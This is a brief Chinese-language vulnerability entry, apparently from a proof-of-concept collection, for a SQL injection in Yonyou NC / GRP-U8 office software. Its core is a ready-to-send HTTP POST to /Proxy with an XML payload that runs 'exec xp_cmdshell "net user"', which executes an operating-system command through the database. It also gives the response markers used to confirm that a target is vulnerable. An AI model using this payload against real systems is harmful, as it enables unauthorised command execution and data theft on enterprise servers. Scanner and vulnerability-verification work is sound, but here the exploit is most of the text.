﻿# 用友 OA nc GRP-u8 sql注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：用友nc等最新版本存在前台SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /Proxy HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

> 响应代码特征：-1

> 响应内容特征：Guest

> 上传文件定位：

> 验证文件来源：用友 OA nc GRP-u8 sql注入.poc
